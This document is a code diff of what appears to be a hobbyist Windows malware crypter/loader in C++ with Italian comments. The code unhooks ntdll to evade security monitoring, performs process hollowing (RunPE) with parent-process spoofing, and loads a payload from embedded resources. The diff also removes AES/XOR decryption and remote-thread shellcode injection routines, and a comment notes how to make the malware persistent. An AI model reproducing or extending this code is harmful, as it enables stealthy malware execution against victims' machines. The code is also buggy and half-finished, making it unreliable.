@@ -1,69 +1,23 @@
+
+#include "encrypt.h"
 #include <iostream>
-#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <wincrypt.h>
-#pragma comment (lib, "crypt32.lib")
-#pragma comment (lib, "advapi32")
+
 #include <psapi.h>
-#include <fstream>
 #include <tlhelp32.h>
 
+void RunPE_self(void*);
 
 
-int AESDecrypt(unsigned char * payload, unsigned int payload_len, char * key, size_t keylen) {
-        HCRYPTPROV hProv;
-        HCRYPTHASH hHash;
-        HCRYPTKEY hKey;
+struct pidnPath 
+{
+    int pid;
+    char path[256];
+};
 
-        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
-                return -1;
-        }
-        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
-                return -1;
-        }
-        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
-            return -1;              
-        }
-        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
-            return -1;
-        }
-
-        DWORD dwBufLen = (DWORD)payload_len;
-        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &dwBufLen)){
-            return -1;
-        }
-
-        CryptReleaseContext(hProv, 0);
-        CryptDestroyHash(hHash);
-        CryptDestroyKey(hKey);
-        
-        return 0;
-}
-
-void ROT_encrypt(unsigned char* str, size_t data_len, int rot){
-    for(int i = 0; i < data_len; i++){
-        str[i] = str[i] + rot;
-    }
-}
-void ROT_decrypt(unsigned char* str, size_t data_len, int rot){
-    for(int i = 0; i < data_len; i++){
-        str[i] = str[i] - rot;
-    }
-}
-
-void XOR(unsigned char * data, size_t data_len, char * key, size_t key_len) {
-	int j;
-	
-	j = 0;
-	for (int i = 0; i < data_len; i++) {
-		if (j == key_len - 1) j = 0;
-
-		data[i] = data[i] ^ key[j];
-		j++;
-	}
-}
 
 //funzione che prende le risorse di un PE
 unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* dwSize) { 
@@ -94,53 +48,59 @@ unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* 
 } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;*/
 //GUARDA LA MIA STREAM, PRENDERE UN PROCESSO TRA QUELLI SEMPRE ATTIVI TIPO QUESTI .EXE
 //!!!!!!!
-int FindTarget(const char *procname) { //zi compila bho
+
+pidnPath FindTarget() { //zi compila bho
     HANDLE hProcSnap;
     PROCESSENTRY32 pe32;
     int pid = 0;
-            
+    char path[256];
+
+    pidnPath pidnpath;
+    
     hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+    if (INVALID_HANDLE_VALUE == hProcSnap){
+        exit(0);
+    } 
             
     pe32.dwSize = sizeof(PROCESSENTRY32); 
             
     if (!Process32First(hProcSnap, &pe32)) {
-            CloseHandle(hProcSnap);
-            return 0;
+        CloseHandle(hProcSnap);
+        exit(0);
     }
             
-    while (Process32Next(hProcSnap, &pe32)) {
-            if (lstrcmpiA(procname, (LPCSTR)pe32.szExeFile) == 0) {
-                    pid = pe32.th32ProcessID;
-                    break;
+    while (Process32Next(hProcSnap, &pe32)) 
+    { 
+        pid = pe32.th32ProcessID;
+        HANDLE hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
+        if (hProcess != NULL){ //ritorna pid solo dei processi che puoi aprire appartenenti a current user(ovvero quelli che riesci a fare OpenProcess)
+            int len = GetProcessImageFileName(hProcess,pidnpath.path,sizeof(path));  
+            if(len > 0){
+
+              
+                    printf("PID: %d\nPATH: %s\n", pid, pidnpath.path);
+
+                    pidnpath.pid = pid;
+                    CloseHandle(hProcess);
+                    break;       
+                
+
+        
             }
+        }
+        //finchè non trovo 
+        CloseHandle(hProcess);
     }
             
     CloseHandle(hProcSnap);
             
-    return pid;
-}
-int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
-
-        LPVOID pRemoteCode = NULL;
-        HANDLE hThread = NULL;
-
-  
-        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
-        
-        hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
-        if (hThread != NULL) {
-                WaitForSingleObject(hThread, 500);
-                CloseHandle(hThread);
-                return 0;
-        }
-        return -1;
+    return pidnpath;
 }
 
-bool CreateProcessWithParent(DWORD parentId, PWSTR commandline,STARTUPINFOA* sia, PROCESS_INFORMATION* pi) {
+
+BOOL CreateProcessWithParent(pidnPath proc_args, PWSTR commandline,STARTUPINFOA* sia, PROCESS_INFORMATION* pi) {
     printf("Prima di OpenProcess");
-    auto hProcess = ::OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentId);
+    auto hProcess = ::OpenProcess(PROCESS_CREATE_PROCESS, FALSE, proc_args.pid);
     printf("Dopo di OpenProcess");
     //probabilmente hProcess ritorna falso perche' esce senza errori o robe troppo strane
 
@@ -185,10 +145,12 @@ bool CreateProcessWithParent(DWORD parentId, PWSTR commandline,STARTUPINFOA* sia
 //ce sta un po dispendioso, cosa? dovresti far iterare quella su tutto il disco finche non trova c.exe e poi ritornare il path
 //potremmo semplicemente hardcodare il path dell eseguibile (tipo svchost.exe o in questo caso c.exe)
 //CreateProcessA((char*)currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED , NULL, NULL, &SI, &PI) non sta nella funzione
-    BOOL created = ::CreateProcess((LPCSTR)"C:\\Users\\jakyd\\Downloads\\GUI_crypter.exe", NULL, NULL, NULL, //glielo passamo?
+
+
+    BOOL created = ::CreateProcess((LPCSTR)proc_args.path, NULL, NULL, NULL, //glielo passamo?
         FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr, 
         (STARTUPINFOA*)&si, pi);
- 
+    printf("%d", created);
     //no grazie alcazzo, comunque siamo riusciti ad aprire un handle al processo remoto, mr fagiano
     // cleanup
     //
@@ -241,7 +203,7 @@ int ntdllUnhooking(){
 		// Update .text section
 		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) { //quando arrivi alla sezione .text della ntdll.dll sovrascrivila con una versione originale
 			DWORD oldProtection = 0;
-			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
+			BOOL isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
 			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
 			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
 		}
@@ -272,8 +234,8 @@ void RunPE_proc(void *pe){
 //BASTA CERCARE IL TUO ESEGUIBILE C.EXE FAGIANOOO
 //cojone l'ho fatto   COMPILA QUESTO E RUNNA, PROVA
     void* pImageBase; //puntatore all' inizio dell' immagine eseguibile(letteralmente il file .exe) del processo che vogliamo attaccarE    int pid FindTarget("svchost.exe");//prova a compila
-    int pid = FindTarget("GUI_crypter.exe"); //si, prova a compilare e runnare, pero' potrebbe comunque non funzionare, forse e' un processo a cui non abbiamo accesso
-    
+    pidnPath proc_args = FindTarget(); //si, prova a compilare e runnare, pero' potrebbe comunque non funzionare, forse e' un processo a cui non abbiamo accesso
+    printf("PID PID PID : %d", proc_args.pid);
     
 ////////////////////////
 ///////////////////////// 
@@ -304,7 +266,7 @@ void RunPE_proc(void *pe){
 
         GetModuleFileNameA(NULL,currentFilePath,sizeof(currentFilePath)); //prendo il path del file .exe che sto eseguendo
 
-        //CreateRunKey(currentFilePath);
+        //CreateRunKey(currentFilePath);  // decommentare questo se si vuole rendere il malware persistente
 
 
         printf("\n\nDOPO GetModuleFileNameA");
@@ -323,7 +285,7 @@ void RunPE_proc(void *pe){
         );*/
         //creo processo in stato sospeso e salvo i valori nelle struct SI e PI
         
-        if (CreateProcessWithParent(pid, nullptr,&SI,&PI)) {//sara' UDP con perdita pacchetti ahahahaha
+        if (CreateProcessWithParent(proc_args, nullptr,&SI,&PI)) {//sara' UDP con perdita pacchetti ahahahaha
             printf("porcoidocidoodcidoodicdoooooooooooo!//!///!/!///!//!/!//!!/!/!//!");
             // alloco memoria per la struct CONTEXT
             CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)); 
@@ -430,7 +392,58 @@ void RunPE_proc(void *pe){
 }
 
 
+/*void run_iterations(){
+    PROCESS_INFORMATION PI; // struct che contiene informazioni sul processo che creeremo
+    STARTUPINFOA SI;    // it is a struct that specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
 
+    CONTEXT* CTX; // struct che contiene i registri del processo che vogliamo attaccare    
+
+    CreateProcessA((char*)currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED , NULL, NULL, &SI, &PI)
+
+
+
+    for(int i = 0; i< nChild; i++){
+        RunPE_proc(PI.pid);
+    }
+
+
+
+    }
+}*/
+
+struct args{
+    int nChild;
+    void* pe;
+};
+
+
+void func(args* arghh){
+
+    for(int i = 0; i< arghh->nChild; i++){
+        RunPE_self(arghh->pe);
+    }
+    return;
+}
+
+void createChild(int nC, void* ppe){
+    args arghhh{nC,ppe};
+    
+    PROCESS_INFORMATION PI; // struct che contiene informazioni sul processo che creeremo
+    STARTUPINFOA SI;    // it is a struct that specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
+
+    CONTEXT* CTX; // struct che contiene i registri del processo che vogliamo attaccare 
+    char path[256];
+    GetModuleFileName(NULL,path,sizeof(path));
+    
+    CreateProcessA((char*)path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED , NULL, NULL, &SI, &PI) ;
+    
+
+    PI.hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)func,&arghhh,0,0);
+    
+
+    //termina
+    TerminateProcess(PI.hProcess, 302);
+}
 void RunPE_self(void* pe){
 
     char currentFilePath[1024];
@@ -503,6 +516,7 @@ void RunPE_self(void* pe){
         }
         if (CreateProcessA((char*)currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED , NULL, NULL, &SI, &PI)) {
 
+                    
             // alloco memoria per la struct CONTEXT
             CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)); 
             CTX->ContextFlags = CONTEXT_FULL; // setto il flag della struct CONTEXT a CONTEXT_FULL per avere tutti i registri del processo che vogliamo attaccare
@@ -657,10 +671,12 @@ int main(){
     //Adesso arriva la roba strana del RunPE
 
     printf("\nprima di ntdllUnhooking\n");
-    
     ntdllUnhooking();
     printf("\ndopo ntdllUnhooking\n");
+
     //RunPE_proc(pe);
-    RunPE_self(pe);
+    for(int i=0;i<2;i++){
+        RunPE_self(pe);
+    }
     return 0;
 }
